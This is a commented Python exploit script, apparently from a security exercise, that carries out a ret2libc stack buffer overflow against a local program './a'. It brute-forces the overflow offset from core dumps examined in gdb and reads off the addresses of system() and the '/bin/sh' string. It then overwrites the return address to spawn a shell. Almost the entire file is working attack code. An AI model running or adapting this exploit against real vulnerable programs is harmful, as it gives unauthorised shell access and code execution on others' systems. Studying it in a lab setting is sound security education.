import os
import re
import struct
import subprocess


# Add /bin/sh to the environment.
os.environ['SHELL'] = '/bin/sh'

# Find what's the offset of buff from the return address.
for n in range(1024, 2048):
    magic  = 'b'*4
    buff   = 'a'*n + magic
    print('trying buff size %d...' % n)
    # This time we'll be working with core dumps to avoid gdb/python differences.
    if os.path.exists('core'):
        os.remove('core')
    pid = os.fork()
    if pid == 0:
        os.execl('./a', './a', buff)
    pid, exit_code = os.waitpid(pid, 0)
    if exit_code == 0:
        print('program did not crash')
        continue
    if not os.path.exists('core'):
        print('no core file created')
        continue
    try:
        # gdb <program> --batch -ex <command> -ex <command> ... loads <program> into gdb and runs all the <commands> on it.
        output = subprocess.check_output(['gdb', './a', '--batch',
            '-ex', 'core core',
            '-ex', 'print $eip',
            '-ex', 'print system',
            '-ex', 'find 0xbfff0000, 0xbfffffff, "/bin/sh"',
            '-ex', 'quit',
        ])
    except subprocess.CalledProcessError:
        print('gdb crashed')
        continue
    # The "print $eip" command prints $1 = 0x...
    eip = re.search(r'\$1 =.*?0x([0-9a-f]*)', output).group(1)
    # The "print system" command prints $2 = {...} 0x... <...>
    system_address = re.search(r'\$2 =.*?0x([0-9a-f]*)', output).group(1)
    # The "find <since>, <until>, <string>" command prints 0x...
    bin_sh_address = re.search(r'^0x([0-9a-f]*)$', output, flags=re.MULTILINE).group(1)
    # If EIP == magic it means the magic landed precisely on the return address, so we've found the offset of buff from it.
    if eip == magic.encode('hex'):
        break
system_address, bin_sh_address = int(system_address, 16), int(bin_sh_address, 16)
print('buff offset is %d, system address is 0x%08x and "/bin/sh" address is 0x%08x' % (n, system_address, bin_sh_address))

# Create our shellcode.
shellcode = 'a'*n + struct.pack('<I', system_address) + 'b'*4 + struct.pack('<I', bin_sh_address)

# Let's go!
os.execl('./a', './a', shellcode)
